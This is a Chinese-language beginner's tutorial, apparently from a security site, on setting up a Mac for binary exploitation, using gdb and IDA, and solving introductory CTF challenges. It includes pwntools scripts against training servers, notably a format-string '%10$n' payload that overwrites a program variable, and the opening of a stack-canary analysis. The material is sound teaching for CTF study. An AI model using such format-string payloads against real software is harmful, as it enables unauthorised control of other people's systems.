> 原文链接: https://www.anquanke.com//post/id/187922 


# Mac 环境下 PWN入门系列（一）


                                阅读量   
                                **710853**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">11</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01085a83ca3713a1ab.jpg)](https://p5.ssl.qhimg.com/t01085a83ca3713a1ab.jpg)



## 0x0 前言

一个菜🐔web狗的转型之路,记录下自己学习PWN的过程。



## 0x1 简单介绍PWN概念

主要参考下: [wiki pwn](https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/)

我们可以看到PWN具体细分话有好几个种类。

这里笔者重点研究的是: Window Kernal and Linux Kernal (window 内核 和 Linux内核)

CTF 的题目多是 关于两种系统内核的模块漏洞,自写一些漏洞代码的程序,然后通过pwn技术获取到相应程序的完全控制权限等操作。

关于Linux 和 Windows,其实利用原理是一样的,只是在实现的过程存在差异,所以入门的话，我们可以直接选择从Linux Pwn入手开始学习。



## 0x2 环境搭建

由于笔者是MAC环境,所以环境安装这块就多点笔墨了。

1.MAC PD虚拟机 Ubuntu 16.04 x64

2.pwntools

3.pwndbg

4.ida

### <a class="reference-link" name="0x1%20mac%E5%AE%89%E8%A3%85pwntools"></a>0x1 mac安装pwntools

采用`homebrew` 安装很方便

```
1.安装pwntools
brew install pwntools

2.安装bintuils 二进制工具
brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-amd64.rb
```

命令执行完之后,我们要导入我们pwntools的包放到环境变量。

```
1./usr/local/Cellar/pwntools/3.12.2_1/libexec/lib/python2.7/site-packages 
2.在系统默认安装包的site-packages写个.pth文件写入上面的地址就可以了
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_123_/t01301c28aaad0d3aaf.jpg)

之后我们就可以使用常用的工具

`checksec /Users/xq17/Desktop/bf743d8c386f4a83b107c49ac6fbcaaf`

[![](https://p2.ssl.qhimg.com/dm/1024_167_/t01d0777dbc71155034.jpg)](https://p2.ssl.qhimg.com/dm/1024_167_/t01d0777dbc71155034.jpg)

最后测试下python的pwn模块

```
import pwn
pwn.asm("xor eax,eax")
```

[![](https://p1.ssl.qhimg.com/dm/1024_215_/t017856f97db6244b85.jpg)](https://p1.ssl.qhimg.com/dm/1024_215_/t017856f97db6244b85.jpg)

这样就代表可以了。

参考链接:[mac下安装pwntools](https://herm1t.tk/MAC/mac%E4%B8%8B%E5%AE%89%E8%A3%85pwntools/)

### <a class="reference-link" name="0x2%20mac%E9%85%8D%E7%BD%AE%20sublime%20%E4%BA%A4%E4%BA%92%E8%BF%90%E8%A1%8C"></a>0x2 mac配置 sublime 交互运行

我们首先需要设置sublime的 `Tools -&gt;Build System -&gt; New Build System`

```
`{`
"path": "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin",
"cmd": ["/usr/bin/python2.7", "-u", "$file"],
"file_regex": "^[ ]*File "(...*?)", line ([0-9]*)",
"selector": "source.python"
`}`
```

我再运行的时候,发现命令行可以执行,但是st3上面执行报这个错误

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_141_/t01cd214df87cc1574a.jpg)

后面问了下vk师傅和google之后发现是设置环境变量的问题: [Reference solve](https://stackoverflow.com/questions/9485699/setupterm-could-not-find-terminal-in-python-program-using-curses)

我们修改下上面的配置为

```
`{`
"path": "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin",
"env":
`{`
    "TERM":"linux",
    "TERMINFO":"/etc/zsh"
`}`,
"cmd": ["/usr/bin/python2.7", "-u", "$file"],
"file_regex": "^[ ]*File "(...*?)", line ([0-9]*)",
"selector": "source.python"
`}`
```

这样就能解决错误啦。 但是我们还得继续解决下交互执行的问题。

我们首先下载

`command + shift + p` 输入 `install Package`

然后在弹出的框输入 `SublimeREPL` 等待下载安装。

(1) 配置快捷键

`preferences` -&gt; `Key Binding` 添加一条

```
`{`
        "keys": ["command+n"],
        "caption": "SublimeREPL: Python - RUN current file",
        "command": "run_existing_window_command",
        "args": `{`
            "id": "repl_python_run",
            "file": "config/Python/Main.sublime-menu"`}`
        `}`,
        `{`
        "keys": ["command+m"],
        "caption": "SublimeREPL: Python - PDB current file",
        "command": "run_existing_window_command",
        "args": `{`
            "id": "repl_python_pdb",
            "file": "config/Python/Main.sublime-menu"`}`
        `}`
```

(2) 配置 `SublimeREPL` 环境变量

`sudo find / -iname "Main.sublime-menu"`

找到路径

`/Users/xq17/Library/Application Support/Sublime Text 3/Packages/SublimeREPL/config/python`

编辑 `Main.sublime-menu`

[![](https://p0.ssl.qhimg.com/dm/1024_560_/t01f7549339ed8dca41.jpg)](https://p0.ssl.qhimg.com/dm/1024_560_/t01f7549339ed8dca41.jpg)

这样我们直接 `command + n` 就能在st3直接进入交互模式

[![](https://p5.ssl.qhimg.com/dm/1024_448_/t01f1552876e69a6ccb.jpg)](https://p5.ssl.qhimg.com/dm/1024_448_/t01f1552876e69a6ccb.jpg)

**小彩蛋: sublime 的快捷键**

`新建一个group: shift + option + command + 2`

`切换group: ctrl + 1 ctrl+2 切换到第几个窗口`

[解决方案链接](https://www.cnblogs.com/JackyXu2018/p/8821482.html)

**当时我还折腾了下pycharm的解决方案(pycharm很适合开发项目,可以用来当作高效开发的选择)**

首先我们要建立python2.7作为解释器

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_477_/t01d2583209df666d83.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_389_/t018ed53b0bef925739.jpg)

这样配置我们的

[![](https://p5.ssl.qhimg.com/dm/1024_747_/t01770dba9abba84c3c.jpg)](https://p5.ssl.qhimg.com/dm/1024_747_/t01770dba9abba84c3c.jpg)

[![](https://p3.ssl.qhimg.com/dm/1024_579_/t01c3f390e2dc12064a.jpg)](https://p3.ssl.qhimg.com/dm/1024_579_/t01c3f390e2dc12064a.jpg)

`Environment variables: TERM=linux;TERMINFO=/etc/zsh`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_207_/t01f588ef1cdb285c40.jpg)

这样我们的运行环境就配置好了

### <a class="reference-link" name="0x3%20MAC%20%E5%AE%89%E8%A3%85%20IDA"></a>0x3 MAC 安装 IDA

这个吾爱很多,有针对mac系列的解决方案。

学习二进制吾爱破解账号应该是标配吧。

[ida帖子](https://www.52pojie.cn/search.php?mod=forum&amp;searchid=36355&amp;orderby=lastpost&amp;ascdesc=desc&amp;searchsubmit=yes&amp;kw=ida)

### <a class="reference-link" name="0x4%20pwndocker%E4%B8%80%E4%BD%93%E5%8C%96%E7%8E%AF%E5%A2%83"></a>0x4 pwndocker一体化环境

我比较懒惰,直接上docker, 推荐一个githud: [**pwndocker**](https://github.com/skysider/pwndocker)

常用工具基本都集成了,非常方便

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_466_/t01b2a5ee9839f4c26a.png)

也有其他镜像

`docker search pwndocker`

**搭建过程:**

我们自己新建一个专门用来存放pwn文件的目录。

`/Users/xq17/Desktop/pwn`

然后在当前目录执行:

```
docker run -d 
    --rm 
    -h mypwn 
    --name mypwn 
    -v $(pwd):/ctf/work 
    -p 23946:23946 
    --cap-add=SYS_PTRACE 
    skysider/pwndocker
```

然后进入:

```
docker exec -it mypwn /bin/bash
```

[![](https://p0.ssl.qhimg.com/dm/1024_184_/t0132658e98dae9f67e.jpg)](https://p0.ssl.qhimg.com/dm/1024_184_/t0132658e98dae9f67e.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_131_/t0147aa31fd99b3d277.jpg)

这样基本就ok拉.

### <a class="reference-link" name="0x5%20%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"></a>0x5 参考链接

[Linux pwn入门教程(0)——环境配置](https://zhuanlan.zhihu.com/p/38639740)



## 0x3 工具介绍篇

### <a class="reference-link" name="0x1%20pwntools"></a>0x1 pwntools

参考链接: [一步一步学pwntools (看雪论坛)](https://bbs.pediy.com/thread-247217.htm)

### <a class="reference-link" name="0x2%20gdb+pwndbg"></a>0x2 gdb+pwndbg

#### <a class="reference-link" name="0x2.1%20%E5%90%AF%E5%8A%A8gdb"></a>0x2.1 启动gdb
<li>
`gdb program` //直接gdb+文件名开始调试, frequent</li>
<li>
`gdb program pid` //gdb调试正在运行的程序</li>
<li>
`gdb -args programs` 解决程序带命令行参数的情况 或者 `run`之后再加上参数</li>
#### <a class="reference-link" name="0x2.2%20%E9%80%80%E5%87%BAgdb"></a>0x2.2 退出gdb

`quit or q`

#### <a class="reference-link" name="0x2.3%20%E5%9C%A8gdb%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F%E5%B8%A6%E9%80%82%E5%90%88%E6%89%A7%E8%A1%8Cshell%E5%91%BD%E4%BB%A4"></a>0x2.3 在gdb调试程序带适合执行shell命令

`shell command args`

#### <a class="reference-link" name="0x2.4%20%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E5%8F%82%E6%95%B0%E7%9A%84%E4%BB%8B%E7%BB%8D"></a>0x2.4 一些基础参数的介绍

> <p>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_442_/t013752878aa407e162.jpg)<br>
gdb的命令分别有:(这里我只说几个重点和常用的)<br>**breakpoints(断点) stack(栈) **<br>`help breakpoints` 可以查看该命令的详细帮助说明<br>`help all` 列出所有命令详细说明<br>`info` 用来获取被调试应用程序的相关信息<br>`show` 用来获取gdb本身设置的信息</p>

更多内容,参考一下链接([GDB命令基础，让你的程序bug无处躲藏](https://deepzz.com/post/gdb-debug.html)) 我很少记忆,都是需要就去查

pwndbg的学习可以参考官方文档: [https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md](https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md)

### <a class="reference-link" name="0x3%20ida%20%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE"></a>0x3 ida 常用快捷键

F5: 反编译出c语言的伪代码,这个基本是我这种菜鸡特别喜欢用的。

空格: IDA VIEW 窗口中 文本视图与图形视图的切换, 好看。 直观，哈哈哈

shift + f12:查找字符串 逆向的时候能快速定位

n: 重命名 整理下程序的命名，能理清楚逻辑

x: 查看交叉引用

### <a class="reference-link" name="0x4%20checksec%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"></a>0x4 checksec简单介绍

保护机制介绍:

> <p>DEP(NX) 不允许执行栈上的数据<br>
RELRO 这个介绍有点长分为两种:<br>
1.Partial RELRO GOT表仍然可写<br>
2.Full RELRO GOT表只读<br>
ASLR(PIE 随机化系统调用地址<br>
stack 栈溢出保护</p>

下面我会针对这些保护继续介绍的,先了解下基本作用和概念。

更细内容可以参考下面的文章

[缓冲区溢出保护机制——Linux](https://www.cnblogs.com/clingyu/p/8546619.html)



## 0x4 实践篇

### <a class="reference-link" name="0x4.1%20%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8pwndpg%E6%9D%A5%E7%90%86%E8%A7%A3%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"></a>0x4.1 学习使用pwndpg来理解程序流程

我们入门先写一个`hello world`的程序

```
#include &lt;stdio.h&gt;
int hello(int a,int b)
`{`
  return a+b;
`}`

int main()
`{`
printf("Hello world!n");
hello(1, 2);
return 0;
`}`
```

编译开启调试选项:

```
gcc -g -Wall test.c -o test
```

然后开启我们gdb调试熟悉下程序的执行流程

因为可以源码debug

直接 1.`b main` 2.`run`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_975_/t01a6a6db1a59f79e15.jpg)

我们看下栈段的信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_670_/t01d28bd729bd3ea492.jpg)

所以我们可以根据这些信息,画出调用`hello`函数的堆栈图。

我们输入`s`,进入到`hello`函数,先记录下没进去之前的`rbp,rsp`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_865_/t01979000ecd0201548.jpg)

这里我们按照指令去跟进call: `ni` `si` 两者区别同上

这里我补充下关于函数调用的汇编知识

> <p>ret 指令是退出函数 等价于 pop RIP<br>
call 指令是调用函数 分为两步:(1)将当前的rip压入栈中 (2)转移到函数内<br>
push RIP<br>
jmp x<br>
push ebp 就是把ebp的**内容**放入当前栈顶单元的上方<br>
pop ebp 从栈顶单元中取出数据送入ebp寄存器中<br>
RSP 指向栈顶单元,会根据栈大小来动态改变。</p>

我们验证下:

[![](https://p4.ssl.qhimg.com/dm/1024_692_/t012418ee05fe2445fa.jpg)](https://p4.ssl.qhimg.com/dm/1024_692_/t012418ee05fe2445fa.jpg)

然后`si`跟进

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_776_/t01550ad7c51ef64d47.jpg)

然后我们获取下rbp的内存地址来画堆栈图

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_234_/t01cbe48068dcdd2693.jpg)

这个时候`rbp`值没改变,但是`rsp`改变了

[![](https://p1.ssl.qhimg.com/dm/1024_203_/t01be55c781cd1e5c2d.jpg)](https://p1.ssl.qhimg.com/dm/1024_203_/t01be55c781cd1e5c2d.jpg)

执行完`mov rbp, rsp`

[![](https://p5.ssl.qhimg.com/dm/1024_205_/t011c490e4d2d32c7b0.jpg)](https://p5.ssl.qhimg.com/dm/1024_205_/t011c490e4d2d32c7b0.jpg)

后面就到`return a+b`,这里没有进行开辟栈空间，所以这些操作并没有在当前栈里面。`rbp rsp`指向同一地址

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_584_/t01406742e4850fb4ca.jpg)

接着执行ret可以看到

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/dm/1024_885_/t01179b5efe29050b59.jpg)

RIP的值就是上面那个栈顶的值, 这就验证了ret =&gt; pop rip

这里栈没什么空间,所以这里丢个简单的栈图

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01eaf5091394ac0677.jpg)

### <a class="reference-link" name="0x4.2%20%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"></a>0x4.2 参考链接

[Linux gcc和gdb程序调试用法](https://blog.csdn.net/chenyiming_1990/article/details/8653900)

[pwn 题GDB调试技巧和exp模板](https://blog.csdn.net/lla520/article/details/77776809)

[【汇编】堆栈和画堆栈图](https://blog.csdn.net/qq_41884002/article/details/81452889)



## 0x5 练习篇

**第一部分我打算从攻防世界的新手区刷起**

### <a class="reference-link" name="0x1%20get_shell"></a>0x1 get_shell

#### <a class="reference-link" name="(1)%20%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E5%8F%8A%E5%85%B6%E8%80%83%E7%82%B9"></a>(1) 题目描述及其考点

> <p>题目描述：运行就能拿到shell呢，真的<br>
考点: 基本的pwntools使用</p>

#### <a class="reference-link" name="(2)%20wp"></a>(2) wp

[![](https://p2.ssl.qhimg.com/dm/1024_571_/t014b1a17fbdf6c02f2.jpg)](https://p2.ssl.qhimg.com/dm/1024_571_/t014b1a17fbdf6c02f2.jpg)

直接hex Fiend查看或者`checksec` 或者用自带的`file x`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_87_/t01d4c072e588473c41.jpg)

可以得知这个程序是64位(x86-64 就是x64)的

我们直接用ida打开,f5一下,可以知道这个题目的确很基础,考察基本的pwn链接。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_237_/t01716c8c354e6222cd.jpg)

可以看出来直接system执行了命令行下的输入

```
int __cdecl main(int argc, const char **argv, const char **envp)
`{`
  puts("OK,this time we will get a shell.");
  system("/bin/sh");
  return 0;
`}`
```

那么我们直接写个连接nc的脚本就行了

上面给出了nc的地址: `111.198.29.45:34462`

```
#!/usr/bin/python
# -*- coding:utf-8 -*-

from pwn import * 
c = remote("111.198.29.45", 34462)
c.interactive()
```

[![](https://p2.ssl.qhimg.com/dm/1024_416_/t0137f9212920161e40.png)](https://p2.ssl.qhimg.com/dm/1024_416_/t0137f9212920161e40.png)

### <a class="reference-link" name="0x2%20CGfsb"></a>0x2 CGfsb

#### <a class="reference-link" name="(1)%20%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E5%8F%8A%E5%85%B6%E8%80%83%E7%82%B9"></a>(1) 题目描述及其考点

> <p>题目描述：菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用<br>
漏洞点: 格式化字符串</p>

#### <a class="reference-link" name="(2)wp"></a>(2)wp

[格式化字符串漏洞利用学习](https://www.cnblogs.com/ichunqiu/p/9329387.html)

我们把附件下载下来,直接ida打开。

我们`checksec`查看下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/dm/1024_170_/t01bd2dee75ed6b8e8e.png)

这是32位架构的,直接用ida64打开是没办法反编译的,这里我们选择用32位ida去打开

然后在左边那个`Function name`窗口按下`m`就会匹配以m开头的函数,找到`main`函数,f5反编译

```
// 这里我选取了重要代码出来,
  puts("please tell me your name:"); 
  read(0, &amp;buf, 0xAu);
  puts("leave your message please:");
  fgets(&amp;s, 100, stdin);
  printf("hello %s", &amp;buf);
  puts("your message is:");
  printf(&amp;s);// 这里漏洞点
  if ( pwnme == 8 )
  `{`
    puts("you pwned me, here is your flag:n");
    system("cat flag");
  `}`
```

`printf()`的标准格式是: printf(“&lt;格式化字符串&gt;”,&lt;参量表&gt;)

首先我们找出偏移量

```
#!/usr/bin/python
# -*- coding:utf-8 -*-

from pwn import *

c = remote("111.198.29.45", 53486)
c.sendlineafter('name:', 'aaa')
c.sendlineafter('please:', 'AAAA %x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x')
c.interactive()
```

`AAAA` 其实就是 `十进制ascii 65-&gt;0x41 (16进制)` 这样看起来比较方便。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_321_/t01312427c7e5d22d64.jpg)

我们可以看到AAAA 相对于格式化字符串的偏移量是10。

[![](https://p5.ssl.qhimg.com/dm/1024_133_/t010120bee31a964b12.jpg)](https://p5.ssl.qhimg.com/dm/1024_133_/t010120bee31a964b12.jpg)

```
#!/usr/bin/python
# -*- coding:utf-8 -*-

from pwn import *

c = remote("111.198.29.45", 53486)
payload = p32(0x0804A068) + '1234' + '%10$n'
c.sendlineafter('name:', 'aaa')
c.sendlineafter('please:', payload)
c.interactive()
```

这里需要介绍`%n`在格式化字符串中作用

> %n: 将%n 之前printf已经打印的字符个数赋值给格式化字符串对应偏移地址位置。

这里因为要pwnme为8,所以我们构造`p32(0x0804A068) + '1234'`8个字节,然后`%10$n`进行赋值给`p32(0x0804A068)`地址,从而pwn掉。

### <a class="reference-link" name="0x3%20when_did_you_born"></a>0x3 when_did_you_born

#### <a class="reference-link" name="(1)%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%E5%8F%8A%E5%85%B6%E8%80%83%E7%82%B9"></a>(1)题目描述及其考点

> <p>只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办<br>
考点: 栈溢出</p>

#### <a class="reference-link" name="(2)%20wp"></a>(2) wp

首先看下文件结构:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_210_/t01091c61124d920f82.png)

这里开启了`Canary`保护,也许你现在对此一无所知,但是没关系,看我细细道来。

> canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致

那么这句话是什么意思呢,就算你不懂汇编，也没关系，听我一点点地举例子来分析。

我们ida64打开下载下来的elf文件, 左边按m找到main函数，代码如下。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c208a9e7396c1468.png)

我们挑取代码下来分析下:

```
.text:0000000000400826 main            proc near ;               DATA XREF: start+1D↑o
.text:0000000000400826
.text:0000000000400826 var_20          = byte ptr -20h
.text:0000000000400826 var_18          = dword ptr -18h
.text:0000000000400826 var_8           = qword ptr -8
.text:0000000000400826
.text:0000000000400826 ; __unwind `{`
.text:0000000000400826                 push    rbp
.text:0000000000400827                 mov     rbp, rsp
.text:000000000040082A                 sub     rsp, 20h
.text:000000000040082E                 mov     rax, fs:28h
.text:0000000000400837                 mov     [rbp+var_8], rax
.text:000000000040083B                 xor     eax, eax
.text:000000000040083D                 mov     rax, cs:stdin
.text:0000000000400844                 mov     esi, 0          ; buf
.text:0000000000400849                 mov     rdi, rax        ; stream
.text:000000000040084C                 call    _setbuf
.text:0000000000400851                 mov     rax, cs:stdout
.text:0000000000400858                 mov     esi, 0          ; buf
.text:000000000040085D                 mov     rdi, rax        ; stream
.text:0000000000400860                 call    _setbuf
.text:0000000000400865                 mov     rax, cs:stderr
.text:000000000040086C                 mov     esi, 0          ; buf
.text:0000000000400871                 mov     rdi, rax        ; stream
.text:0000000000400874                 call    _setbuf
.text:0000000000400879                 mov     edi, offset s   ; "What's Your Birth?"
.text:000000000040087E                 call    _puts
.text:0000000000400883                 lea     rax, [rbp+var_20]
.text:0000000000400887                 add     rax, 8
.text:000000000040088B                 mov     rsi, rax
.text:000000000040088E                 mov     edi, offset aD  ; "%d"
.text:0000000000400893                 mov     eax, 0
.text:0000000000400898                 call    ___isoc99_scanf
.text:000000000040089D                 nop
```

> <p>补充一些基础的汇编知识点:<br>
; 分号代表注释</p>

```
main            proc near ;   代表main子程序的开始 可以类比为 main()`{``}`中的 main`{`
```

```
main            endp ;代表main子程序的结束,类比为 main()`{``}` 中的 `}`
```

> <p>.text:0000000000400826 var_20 = byte ptr -20h<br>
.text:0000000000400826 var_18 = dword ptr -18h<br>
.text:0000000000400826 var_8 = qword ptr -8<br>
= 用来定义一个一个常量<br>
操作符 x ptr 指明内存单元的长度<br>
byte ptr代表是字节单元<br>
word ptr 代表是字单元(两个字节大小)<br>
dword ptr 代表是双字单元(4个字节大小)<br>
qword ptr 代表是四字单元(8个字节大小)</p>

下面是cannary的重点了.

```
.text:0000000000400826                 push    rbp
.text:0000000000400827                 mov     rbp, rsp
.text:000000000040082A                 sub     rsp, 20h
.text:000000000040082E                 mov     rax, fs:28h
```

> <p>理解这里,我们先掌握一些小知识<br>
调用函数过程涉及到三个寄存器(寄存器可以理解为一个存放值的盒子)<br>
分别是 sp,bp,ip (16位cpu) esp,ebp,eip(32位cpu) rsp,rbp,rip(64位cpu)<br>
rsp用来存储函数调用栈的栈顶地址,在压栈和退栈时发生变化。<br>
rbp用来存储当前函数状态的基地址，在函数运行时不变，用来索引确定函数的参数或局部变量的位置<br>
rip 用来存储即将执行的程序指令的地址, cpu根据eip的存储内容读取指令并执行(程序控制指令模式)<br>
栈空间增长方式是从高地址到地址的,也就是栈顶的地址值是小于栈底的地址值的</p>

我们可以通过gdb调试画出对应的堆栈图

我们复制下push rbp的指令地址,然后打个断点,然后r(run)

